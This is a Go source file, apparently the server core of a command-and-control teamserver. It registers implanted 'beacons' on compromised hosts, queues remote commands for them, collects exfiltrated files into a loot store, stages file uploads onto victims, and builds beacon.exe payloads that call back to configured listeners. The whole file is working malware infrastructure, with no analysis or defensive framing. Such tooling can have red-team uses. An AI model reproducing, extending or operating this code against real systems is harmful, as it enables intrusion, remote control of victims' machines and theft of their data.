package server

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"c2/ui"
	"crypto/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"c2/builder"
	"c2/models"
	"c2/protocol"
	"c2/store"
)

type saver interface {
	SaveListeners([]*models.Listener)
	SaveBeacons([]*models.Beacon)
	SaveResults(map[uint32][]*models.Result)
	SaveEvents([]*models.Event)
	SaveTerminals(map[uint32]*models.TerminalState)
	SaveLoot([]*models.ExfilEntry)
	SaveRSAKey(*rsa.PrivateKey)
}

type Handler struct {
	store          *store.Store
	privKey        *rsa.PrivateKey
	beaconSrc      string // empty = build disabled
	lm             listenerStarter
	p              saver
	managementPort int
}

func NewHandler(s *store.Store, privKey *rsa.PrivateKey, beaconSrc string, lm listenerStarter, p saver, managementPort int) *Handler {
	return &Handler{store: s, privKey: privKey, beaconSrc: beaconSrc, lm: lm, p: p, managementPort: managementPort}
}

func (h *Handler) logEvent(evType, msg string) {
	evt := &models.Event{Type: evType, Message: msg, Timestamp: time.Now()}
	h.store.AddEvent(evt)
	h.p.SaveEvents(h.store.ListEvents())
}

// newBeaconMux returns a mux with only the beacon protocol routes.
// Used by additional (non-management) listeners.
func newBeaconMux(h *Handler) *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/pubkey", h.HandleGetPubKey)
	mux.HandleFunc("POST /api/register", h.HandleRegister)
	mux.HandleFunc("POST /api/checkin", h.HandleCheckin)
	mux.HandleFunc("POST /api/result", h.HandleResult)
	return mux
}

func (h *Handler) HandleGetPubKey(w http.ResponseWriter, r *http.Request) {
	pubDER, err := x509.MarshalPKIXPublicKey(&h.privKey.PublicKey)
	if err != nil {
		http.Error(w, "key marshal error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain")
	pem.Encode(w, &pem.Block{Type: "PUBLIC KEY", Bytes: pubDER})
}

func (h *Handler) HandleRegister(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 8*1024))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	plaintext, err := protocol.DecryptMetadata(h.privKey, body)
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	meta, err := protocol.DecodeImplantMetadata(plaintext)
	if err != nil {
		http.Error(w, "decode error", http.StatusBadRequest)
		return
	}

	// Capture listener ID from context (injected by middleware)
	if id, ok := r.Context().Value(listenerIDKey).(uint32); ok {
		meta.ListenerID = id
	} else {
		// Default to ID 1 if not through a dynamic listener (management listener)
		meta.ListenerID = 1
	}

	if !h.store.RegisterBeacon(meta) {
		http.Error(w, "duplicate beacon id", http.StatusConflict)
		return
	}
	h.p.SaveBeacons(h.store.ListBeacons())
	h.logEvent("new", fmt.Sprintf("new session #%d %s %s", meta.ID, meta.Hostname, meta.Username))
	w.WriteHeader(http.StatusOK)
}

func (h *Handler) HandleCheckin(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 64))
	if err != nil || len(body) < 4 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	beaconID := binary.LittleEndian.Uint32(body[:4])
	beacon := h.store.GetBeacon(beaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	h.store.UpdateLastSeen(beaconID)
	h.p.SaveBeacons(h.store.ListBeacons())

	tasks := h.store.DrainPendingTasks(beaconID)

	var payload []byte
	if len(tasks) == 0 {
		nop := protocol.NewNOP()
		payload = protocol.EncodeHeader(nop.Header)
	} else {
		for _, task := range tasks {
			hdr := protocol.TaskHeader{
				Type:       task.Type,
				Code:       task.Code,
				Flags:      task.Flags,
				Label:      task.Label,
				Identifier: task.Identifier,
				Length:     uint32(len(task.Data)),
			}
			payload = append(payload, append(protocol.EncodeHeader(hdr), task.Data...)...)
		}
	}

	encrypted, err := protocol.Encrypt(beacon.SessionKey, payload)
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	if _, err := w.Write(encrypted); err != nil {
		ui.Errorf("checkin", "write: %v", err)
	}

	for _, task := range tasks {
		if task.Type == protocol.TaskSet && task.Code == 0 && len(task.Data) >= 8 {
			interval := binary.LittleEndian.Uint32(task.Data[:4])
			jitter := binary.LittleEndian.Uint32(task.Data[4:8])
			h.store.UpdateBeaconSleep(beaconID, interval, jitter)
			h.store.StoreResult(&models.Result{
				Label:      task.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskSet,
				Output:     fmt.Sprintf("sleep=%ds jitter=%d%%", interval, jitter),
				ReceivedAt: time.Now(),
			})
			h.store.MarkTaskDone(task.Label)
			h.p.SaveBeacons(h.store.ListBeacons())
			h.p.SaveResults(h.store.AllResults())
		}

		if task.Type == protocol.TaskExit {
			h.store.DeleteBeacon(beaconID)
			h.p.SaveBeacons(h.store.ListBeacons())
			h.p.SaveResults(h.store.AllResults())
		}
	}
}

func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 2*1024*1024))
	if err != nil || len(body) < 4 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	beaconID := binary.LittleEndian.Uint32(body[:4])
	beacon := h.store.GetBeacon(beaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	h.store.UpdateLastSeen(beaconID)
	h.p.SaveBeacons(h.store.ListBeacons())

	plaintext, err := protocol.Decrypt(beacon.SessionKey, body[4:])
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	if len(plaintext) < 16 {
		http.Error(w, "payload too short", http.StatusBadRequest)
		return
	}

	hdr, err := protocol.DecodeHeader(plaintext[:16])
	if err != nil {
		http.Error(w, "decode header error", http.StatusBadRequest)
		return
	}

	if hdr.Type == protocol.TaskFileExfil {
		done, filename, assembled := h.store.AddExfilFragment(hdr.Label, hdr.Identifier, hdr.Flags, plaintext[16:])
		if done {
			if filename == "" {
				ui.Errorf("exfil", "label=%d completed with empty filename, discarding", hdr.Label)
				w.WriteHeader(http.StatusOK)
				return
			}
			if err := h.saveExfilFile(hdr.Label, filename, assembled); err != nil {
				ui.Errorf("exfil", "save label=%d: %v", hdr.Label, err)
				h.store.StoreResult(&models.Result{
					Label:      hdr.Label,
					BeaconID:   beaconID,
					Type:       protocol.TaskFileExfil,
					Flags:      1, // FLAG_ERROR
					Output:     fmt.Sprintf("disk save failed: %v", err),
					ReceivedAt: time.Now(),
				})
				h.store.MarkTaskDone(hdr.Label)
				h.p.SaveResults(h.store.AllResults())
				w.WriteHeader(http.StatusOK)
				return
			}
			h.store.MarkExfilDone(hdr.Label, filename, beaconID, int64(len(assembled)))
			h.logEvent("exfil", fmt.Sprintf("file exfiltrated from #%d: %s (%d bytes)", beaconID, filename, len(assembled)))
			h.store.StoreResult(&models.Result{
				Label:      hdr.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskFileExfil,
				Filename:   filename,
				ReceivedAt: time.Now(),
			})
			h.store.MarkTaskDone(hdr.Label)
			h.p.SaveResults(h.store.AllResults())
			h.p.SaveLoot(h.store.ListExfilFiles())
		}
	} else if hdr.Type == protocol.TaskFileStage {
		output, _ := protocol.DecodeRunRep(plaintext[16:])
		h.logEvent("upload", fmt.Sprintf("file staged on #%d: %s", beaconID, output))
		h.store.StoreResult(&models.Result{
			Label:      hdr.Label,
			BeaconID:   beaconID,
			Type:       protocol.TaskFileStage,
			Flags:      hdr.Flags,
			Output:     output,
			ReceivedAt: time.Now(),
		})
		h.store.MarkTaskDone(hdr.Label)
		h.p.SaveResults(h.store.AllResults())
	} else {
		output, _ := protocol.DecodeRunRep(plaintext[16:])
		h.store.StoreResult(&models.Result{
			Label:      hdr.Label,
			BeaconID:   beaconID,
			Flags:      hdr.Flags,
			Output:     output,
			ReceivedAt: time.Now(),
		})
		h.store.MarkTaskDone(hdr.Label)
		h.p.SaveResults(h.store.AllResults())
	}

	w.WriteHeader(http.StatusOK)
}

func (h *Handler) saveExfilFile(label uint32, filename string, data []byte) error {
	if err := os.MkdirAll("exfil", 0755); err != nil {
		return err
	}
	path := filepath.Join("exfil", fmt.Sprintf("%d_%s", label, filepath.Base(filename)))
	return os.WriteFile(path, data, 0644)
}

func (h *Handler) HandleQueueTask(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BeaconID uint32 `json:"beacon_id"`
		Type     uint8  `json:"type"`
		Code     uint8  `json:"code"`
		Args     string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	if h.store.GetBeacon(req.BeaconID) == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	var data []byte
	if req.Type == protocol.TaskRun {
		data = protocol.EncodeRunReq(req.Args)
	} else if req.Type == protocol.TaskFileExfil {
		data = append([]byte(req.Args), 0) // null-terminated path for beacon
	} else if req.Type == protocol.TaskSet && req.Code == 0 { // CODE_SET_SLEEP
		// Parse "seconds [jitter]"
		parts := strings.Fields(req.Args)
		var seconds, jitter uint32
		if len(parts) >= 1 {
			v, _ := strconv.ParseUint(parts[0], 10, 32)
			seconds = uint32(v)
		}
		if len(parts) >= 2 {
			v, _ := strconv.ParseUint(parts[1], 10, 32)
			jitter = uint32(v)
		} else {
			jitter = 20 // Default jitter
		}
		data = protocol.EncodeSetSleepReq(seconds, jitter)
	}

	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])
	h.store.QueueTask(&models.Task{
		Label:     label,
		BeaconID:  req.BeaconID,
		Type:      req.Type,
		Code:      req.Code,
		Data:      data,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	})

	h.logEvent("task", fmt.Sprintf("task queued #%d type=%d args=%s", req.BeaconID, req.Type, req.Args))

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Label uint32 `json:"label"`
	}{Label: label})
}

func (h *Handler) HandleGetSessions(w http.ResponseWriter, r *http.Request) {
	beacons := h.store.ListBeacons()
	type item struct {
		ID           uint32 `json:"id"`
		Hostname     string `json:"hostname"`
		Username     string `json:"username"`
		ProcessName  string `json:"process_name"`
		ProcessID    uint32 `json:"process_id"`
		Arch         uint8  `json:"arch"`
		Platform     uint8  `json:"platform"`
		Integrity    uint8  `json:"integrity"`
		Sleep        uint32 `json:"sleep"`
		FirstSeen    int64  `json:"first_seen"`
		LastSeen     int64  `json:"last_seen"`
		Alive        bool   `json:"alive"`
		ListenerID   uint32 `json:"listener_id"`
		ListenerName string `json:"listener_name"`
	}
	resp := make([]item, len(beacons))
	for i, b := range beacons {
		lName := "Unknown"
		if l := h.store.GetListener(b.ListenerID); l != nil {
			lName = l.Name
		}
		resp[i] = item{
			ID:           b.ID,
			Hostname:     b.Hostname,
			Username:     b.Username,
			ProcessName:  b.ProcessName,
			ProcessID:    b.ProcessID,
			Arch:         b.Arch,
			Platform:     b.Platform,
			Integrity:    b.Integrity,
			Sleep:        b.Sleep,
			FirstSeen:    b.FirstSeen.Unix(),
			LastSeen:     b.LastSeen.Unix(),
			Alive:        b.IsAlive(),
			ListenerID:   b.ListenerID,
			ListenerName: lName,
		}
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleGetResults(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	var since int64
	if s := r.URL.Query().Get("since"); s != "" {
		since, _ = strconv.ParseInt(s, 10, 64)
	}

	results := h.store.GetResultsSince(beaconID, since)
	type item struct {
		Label      uint32 `json:"label"`
		BeaconID   uint32 `json:"beacon_id"`
		Flags      uint16 `json:"flags"`
		Type       uint8  `json:"type"`
		Filename   string `json:"filename,omitempty"`
		Output     string `json:"output"`
		ReceivedAt int64  `json:"received_at"`
	}
	resp := make([]item, len(results))
	for i, res := range results {
		resp[i] = item{
			Label:      res.Label,
			BeaconID:   res.BeaconID,
			Flags:      res.Flags,
			Type:       res.Type,
			Filename:   res.Filename,
			Output:     res.Output,
			ReceivedAt: res.ReceivedAt.Unix(),
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
	if h.beaconSrc == "" {
		http.Error(w, "build not configured — start teamserver with -beacon-src <path>", http.StatusNotImplemented)
		return
	}

	var req struct {
		ListenerID uint32 `json:"listener_id"`
		SleepMS    int    `json:"sleep_ms"`
		JitterPct  int    `json:"jitter_pct"`
		Format     string `json:"format"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	l := h.store.GetListener(req.ListenerID)
	if l == nil {
		http.Error(w, "unknown listener_id", http.StatusBadRequest)
		return
	}
	if l.Host == "" {
		http.Error(w, "listener has no public host configured", http.StatusBadRequest)
		return
	}

	data, err := builder.Build(builder.BuildParams{
		ServerHost:       l.Host,
		ServerPort:       l.Port,
		SleepMS:          req.SleepMS,
		JitterPct:        req.JitterPct,
		BeaconSrc:        h.beaconSrc,
		UseHTTPS:         l.Scheme == "https",
		IgnoreCertErrors: l.AutoCert,
		Format:           req.Format,
	})
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}

	filename := "beacon.exe"
	if req.Format == "bin" {
		filename = "beacon.bin"
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
	if _, err := w.Write(data); err != nil {
		ui.Errorf("build", "write %s: %v", filename, err)
	}
}

func (h *Handler) HandleListListeners(w http.ResponseWriter, r *http.Request) {
	listeners := h.store.ListListeners()
	type item struct {
		ID            uint32            `json:"id"`
		Name          string            `json:"name"`
		Scheme        string            `json:"scheme"`
		Host          string            `json:"host"`
		BindAddr      string            `json:"bind_addr"`
		Port          int               `json:"port"`
		CustomHeaders map[string]string `json:"custom_headers,omitempty"`
		IsDefault     bool              `json:"is_default"`
		AutoCert      bool              `json:"auto_cert"`
	}
	resp := make([]item, len(listeners))
	for i, l := range listeners {
		resp[i] = item{
			ID:            l.ID,
			Name:          l.Name,
			Scheme:        l.Scheme,
			Host:          l.Host,
			BindAddr:      l.BindAddr,
			Port:          l.Port,
			CustomHeaders: l.CustomHeaders,
			IsDefault:     l.IsDefault,
			AutoCert:      l.AutoCert,
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleCreateListener(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name          string            `json:"name"`
		Scheme        string            `json:"scheme"`
		Host          string            `json:"host"`
		BindAddr      string            `json:"bind_addr"`
		Port          int               `json:"port"`
		CertPEM       string            `json:"cert_pem"`
		KeyPEM        string            `json:"key_pem"`
		CustomHeaders map[string]string `json:"custom_headers"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		http.Error(w, "name required", http.StatusBadRequest)
		return
	}
	if req.Scheme != "http" && req.Scheme != "https" {
		http.Error(w, "scheme must be http or https", http.StatusBadRequest)
		return
	}
	if req.Host == "" {
		http.Error(w, "host required", http.StatusBadRequest)
		return
	}
	if req.Port < 1 || req.Port > 65535 {
		http.Error(w, "port must be 1-65535", http.StatusBadRequest)
		return
	}
	if req.Port == h.managementPort {
		http.Error(w, "port already in use by management server", http.StatusConflict)
		return
	}
	if h.store.PortInUse(req.Port) {
		http.Error(w, "port already in use by another listener", http.StatusConflict)
		return
	}
	if req.CertPEM != "" && req.KeyPEM == "" {
		http.Error(w, "key_pem is required when cert_pem is provided", http.StatusBadRequest)
		return
	}
	bindAddr := req.BindAddr
	if bindAddr == "" {
		bindAddr = "0.0.0.0"
	}

	l := &models.Listener{
		Name:          req.Name,
		Scheme:        req.Scheme,
		Host:          req.Host,
		BindAddr:      bindAddr,
		Port:          req.Port,
		CustomHeaders: req.CustomHeaders,
	}
	if req.CertPEM != "" {
		l.CertPEM = []byte(req.CertPEM)
		l.KeyPEM = []byte(req.KeyPEM)
	}

	h.store.AddListener(l)

	if err := h.lm.Start(l, newBeaconMux(h)); err != nil {
		h.store.RemoveListener(l.ID)
		http.Error(w, "failed to start listener: "+err.Error(), http.StatusInternalServerError)
		return
	}
	h.p.SaveListeners(h.store.ListListeners())
	h.logEvent("listener", fmt.Sprintf("listener created: %s %s://:%d", l.Name, l.Scheme, l.Port))

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(struct {
		ID uint32 `json:"id"`
	}{ID: l.ID})
}

func (h *Handler) HandleDeleteListener(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	id := uint32(id64)

	l := h.store.GetListener(id)
	if l == nil {
		http.Error(w, "unknown listener", http.StatusNotFound)
		return
	}
	if l.IsDefault {
		http.Error(w, "cannot delete default listener", http.StatusForbidden)
		return
	}
	if err := h.lm.Stop(id); err != nil {
		http.Error(w, "stop failed: "+err.Error(), http.StatusInternalServerError)
		return
	}
	h.logEvent("listener", fmt.Sprintf("listener deleted: %s #%d", l.Name, id))
	h.store.RemoveListener(id)
	h.p.SaveListeners(h.store.ListListeners())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleUpload(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(256 << 20); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}

	beaconIDStr := r.FormValue("beacon_id")
	destPath := r.FormValue("dest_path")
	beaconIDVal, err := strconv.ParseUint(beaconIDStr, 10, 32)
	if err != nil || destPath == "" {
		http.Error(w, "missing beacon_id or dest_path", http.StatusBadRequest)
		return
	}
	if len(destPath) > 260 {
		http.Error(w, "dest_path exceeds MAX_PATH (260 bytes)", http.StatusBadRequest)
		return
	}
	beaconID := uint32(beaconIDVal)

	if h.store.GetBeacon(beaconID) == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	file, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "missing file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}

	const chunkSize = 64 * 1024
	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])
	pathBytes := []byte(destPath)
	pathLen := uint16(len(pathBytes))

	total := len(fileBytes)
	chunkIndex := uint32(0)
	offset := 0

	enqueue := func(chunk []byte, isFirst, isLast bool) {
		var flags uint16 = protocol.FlagFragmented
		if isLast {
			flags = protocol.FlagLastFragment
		}
		var data []byte
		if isFirst {
			data = append(data, byte(pathLen), byte(pathLen>>8))
			data = append(data, pathBytes...)
		}
		data = append(data, chunk...)
		h.store.QueueTask(&models.Task{
			BeaconID:   beaconID,
			Type:       protocol.TaskFileStage,
			Code:       0,
			Flags:      flags,
			Label:      label,
			Identifier: chunkIndex,
			Data:       data,
			Status:     models.TaskStatusPending,
		})
		chunkIndex++
	}

	if total == 0 {
		enqueue(nil, true, true)
	} else {
		for offset < total {
			end := offset + chunkSize
			if end > total {
				end = total
			}
			enqueue(fileBytes[offset:end], offset == 0, end >= total)
			offset = end
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"label":  label,
		"chunks": chunkIndex,
	})
}

func (h *Handler) HandleListFiles(w http.ResponseWriter, r *http.Request) {
	files := h.store.ListExfilFiles()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(files)
}

func (h *Handler) HandleGetFile(w http.ResponseWriter, r *http.Request) {
	labelStr := r.PathValue("label")
	labelVal, err := strconv.ParseUint(labelStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid label", http.StatusBadRequest)
		return
	}
	label := uint32(labelVal)

	entry := h.store.GetExfilFile(label)
	if entry == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	diskPath := filepath.Join("exfil", fmt.Sprintf("%d_%s", entry.Label, filepath.Base(entry.Filename)))
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(entry.Filename)))
	http.ServeFile(w, r, diskPath)
}

func (h *Handler) HandleDeleteFile(w http.ResponseWriter, r *http.Request) {
	labelStr := r.PathValue("label")
	labelVal, err := strconv.ParseUint(labelStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid label", http.StatusBadRequest)
		return
	}
	label := uint32(labelVal)

	entry := h.store.GetExfilFile(label)
	if entry == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	diskPath := filepath.Join("exfil", fmt.Sprintf("%d_%s", entry.Label, filepath.Base(entry.Filename)))
	if err := os.Remove(diskPath); err != nil && !os.IsNotExist(err) {
		ui.Errorf("loot", "remove %s: %v", diskPath, err)
	}
	h.store.DeleteExfilFile(label)
	h.p.SaveLoot(h.store.ListExfilFiles())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleKillBeacon(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	b := h.store.GetBeacon(beaconID)
	if b == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	if !b.IsAlive() {
		h.logEvent("kill", fmt.Sprintf("removed dead beacon #%d %s", beaconID, b.Hostname))
		h.store.DeleteBeacon(beaconID)
		h.p.SaveBeacons(h.store.ListBeacons())
		h.p.SaveResults(h.store.AllResults())
		w.WriteHeader(http.StatusNoContent)
		return
	}

	h.logEvent("kill", fmt.Sprintf("kill sent #%d %s", beaconID, b.Hostname))

	var killLabelBytes [4]byte
	if _, err := rand.Read(killLabelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	h.store.QueueTask(&models.Task{
		Label:     binary.LittleEndian.Uint32(killLabelBytes[:]),
		BeaconID:  beaconID,
		Type:      protocol.TaskExit,
		Code:      protocol.CodeExitNormal,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	})

	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleGetEvents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(h.store.ListEvents())
}

func (h *Handler) HandlePostEvent(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Type    string `json:"type"`
		Message string `json:"message"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	evt := &models.Event{
		Type:      req.Type,
		Message:   req.Message,
		Timestamp: time.Now(),
	}
	h.store.AddEvent(evt)
	h.p.SaveEvents(h.store.ListEvents())
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(evt)
}

func (h *Handler) HandleGetTerminal(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	state := h.store.GetTerminal(uint32(id64))
	if state == nil {
		state = &models.TerminalState{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(state)
}

func (h *Handler) HandlePutTerminal(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	var state models.TerminalState
	if err := json.NewDecoder(r.Body).Decode(&state); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	h.store.SetTerminal(uint32(id64), &state)
	h.p.SaveTerminals(h.store.ListTerminals())
	w.WriteHeader(http.StatusNoContent)
}
